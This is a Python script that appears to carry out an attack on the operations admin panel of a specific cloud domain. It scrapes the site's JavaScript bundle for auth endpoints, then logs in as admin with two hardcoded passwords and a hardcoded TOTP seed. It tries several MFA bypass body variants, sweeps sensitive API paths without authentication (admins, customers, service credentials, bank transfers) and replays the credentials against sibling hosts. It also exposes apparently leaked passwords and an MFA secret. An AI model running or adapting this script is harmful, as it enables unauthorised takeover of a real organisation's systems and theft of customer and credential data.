#!/usr/bin/env python3
# i29518 round D: ops login (distinct keys), MFA/TOTP flow, unauth GET sweep, host variants
import json, base64, subprocess, re, time, os, hmac, hashlib, struct
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
H="cloud-admin.lumiiai.cn"; START=time.time()
def _b(s):
    if not isinstance(s,str): s=json.dumps(s,ensure_ascii=False,default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s"%(k,_b(v)),flush=True)
def run(a,timeout=60):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def http(url,method="GET",body=None,headers=None,timeout=25,maxlen=400000,jar=None,full=False):
    hd="/tmp/hdr.txt"
    a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-D",hd,"-w","\n__C__%{http_code}\n__T__%{content_type}"]
    for h in (headers or []): a+=["-H",h]
    if jar: a+=["-b",jar,"-c",jar]
    if body is not None:
        a+=["-X",method,"--data-binary", body if isinstance(body,str) else json.dumps(body)]
        if not any(h.lower().startswith("content-type") for h in (headers or [])): a+=["-H","Content-Type: application/json"]
    elif method!="GET": a+=["-X",method]
    a+=[url]
    rc,out,err=run(a,timeout=timeout+15)
    t=out.decode("utf-8","replace"); c=""; ct=""
    m=re.search(r"\n__T__([^\n]*)",t)
    if m: ct=m.group(1); t=t[:m.start()]
    i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    hdr=""
    try: hdr=open(hd).read()
    except: pass
    setcookie=[l for l in hdr.splitlines() if l.lower().startswith("set-cookie")]
    return {"code":c,"ct":ct,"body":t[:maxlen],"setcookie":setcookie,"hdr":hdr[:1500]}

def totp(seed, ts=None, step=30, digits=6):
    s=seed.strip().replace(" ","").upper(); s+="="*((8-len(s)%8)%8)
    key=base64.b32decode(s)
    if ts is None: ts=time.time()
    ctr=int(ts//step)
    h=hmac.new(key, struct.pack(">Q",ctr), hashlib.sha1).digest()
    o=h[-1]&0x0f
    code=(struct.unpack(">I",h[o:o+4])[0]&0x7fffffff)%(10**digits)
    return "%0*d"%(digits,code)

# ---- bundle context for login/mfa ----
b=http("https://%s/assets/ops-DK81mX7e.js"%H,timeout=45,maxlen=3000000)["body"]
def ctx(kw,before=300,after=500,n=8):
    out=[]
    for m in re.finditer(re.escape(kw),b):
        out.append(b[max(0,m.start()-before):m.start()+after].replace("\n"," "))
        if len(out)>=n: break
    return out
for kw in ["mfa_required","bad_credentials","/v1/ops/mfa/verify","/v1/ops/mfa/setup","/v1/ops/login","pending","recovery","totp"]:
    R("ctx_"+re.sub(r'[^A-Za-z0-9]','_',kw), ctx(kw))
# ---- login with distinct keys, capture headers/cookies ----
jar="/tmp/cj2.txt"
creds=[("admin","iGIqnu4f8UGepPjBtQRt","c_iGIq"),("admin","PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP","c_PIf8")]
hdrs=['Origin: https://cloud-admin.lumiiai.cn','Referer: https://cloud-admin.lumiiai.cn/','Accept: application/json']
lres={}
for u,pw,tag in creds:
    r=http("https://%s/v1/ops/login"%H,"POST",{"username":u,"password":pw},headers=hdrs,timeout=25,maxlen=4000,jar=jar)
    lres[tag]={"code":r["code"],"ct":r["ct"],"body":r["body"],"setcookie":r["setcookie"],"hdr":r["hdr"]}
    print("login",tag,r["code"],r["body"][:200].replace("\n"," "),flush=True)
R("login2",lres)
# TOTP code now
SEED="76CB3BZ7EFX6W2W3QNP4XW355KNJL56V"
try:
    codes=[totp(SEED,time.time()+d) for d in (-30,0,30)]
except Exception as e:
    codes=["ERR:"+repr(e)]
R("totp",{"seed":SEED,"codes":codes,"epoch":int(time.time())})
# try combined login with code, and mfa verify flows
mfa={}
for cd in codes[:2]:
    # variants of login body with code
    for body in [{"username":"admin","password":"iGIqnu4f8UGepPjBtQRt","code":cd},
                 {"username":"admin","password":"iGIqnu4f8UGepPjBtQRt","totp":cd},
                 {"username":"admin","password":"iGIqnu4f8UGepPjBtQRt","mfaCode":cd}]:
        r=http("https://%s/v1/ops/login"%H,"POST",body,headers=hdrs,timeout=25,maxlen=3000,jar=jar)
        mfa["login_code_%s_%s"%(cd,list(body.keys())[2])]={"code":r["code"],"body":r["body"][:800],"setcookie":r["setcookie"]}
        print("login+code",list(body.keys())[2],cd,r["code"],r["body"][:120].replace("\n"," "),flush=True)
    for body in [{"code":cd},{"totp":cd},{"code":cd,"username":"admin"},{"code":cd,"password":"iGIqnu4f8UGepPjBtQRt"}]:
        r=http("https://%s/v1/ops/mfa/verify"%H,"POST",body,headers=hdrs,timeout=25,maxlen=3000,jar=jar)
        mfa["verify_%s_%s"%(cd,"_".join(body.keys()))]={"code":r["code"],"body":r["body"][:800],"setcookie":r["setcookie"]}
        print("mfa verify",cd,"_".join(body.keys()),r["code"],r["body"][:120].replace("\n"," "),flush=True)
R("mfa",mfa)
# ---- unauth GET sweep ----
opaths=["/v1/ops/me","/v1/ops/admins","/v1/ops/instances","/v1/ops/customers","/v1/ops/enterprises","/v1/ops/audit","/v1/ops/alerts","/v1/ops/approvals","/v1/ops/provision-jobs","/v1/ops/provision-jobs/summary","/v1/ops/registry/enterprises","/v1/ops/registry/market/listed","/v1/ops/service-credentials","/v1/ops/platform-models","/v1/ops/plans","/v1/ops/orders","/v1/ops/invoices","/v1/ops/accounts/lookup","/v1/ops/tenant-dns/deletions","/v1/ops/token-plan-deliveries","/v1/ops/reconcile","/v1/ops/saas-price-list","/v1/ops/model-prices","/v1/ops/certifications","/v1/ops/account-deletions","/v1/ops/moderation","/v1/ops/transfers/banks"]
sweep={}
for p in opaths:
    r=http("https://%s%s"%(H,p),timeout=20,maxlen=800,jar=jar)
    sweep[p]={"code":r["code"],"body":r["body"][:300]}
R("sweep",sweep)
# ---- host variants for same API ----
hv={}
for hh in ["cloud-ops.lumiiai.cn","cloud-api.lumiiai.cn","cloud.lumiiai.cn","ops.lumiiai.cn"]:
    r=http("https://%s/v1/ops/login"%hh,"POST",{"username":"admin","password":"iGIqnu4f8UGepPjBtQRt"},headers=hdrs,timeout=20,maxlen=1500)
    hv[hh+"/v1/ops/login"]={"code":r["code"],"ct":r["ct"],"body":r["body"][:400]}
    print("host",hh,r["code"],r["body"][:100].replace("\n"," "),flush=True)
dns={}
for n in ["cloud-api.lumiiai.cn","ops.lumiiai.cn","cloud-ops.lumiiai.cn","shared-1.lumiiai.cn"]:
    rc,out,err=run(["getent","hosts",n],timeout=15); dns[n]=out.decode().strip()
R("hostvar",{"http":hv,"dns":dns})
print("DONE",time.time()-START,flush=True)
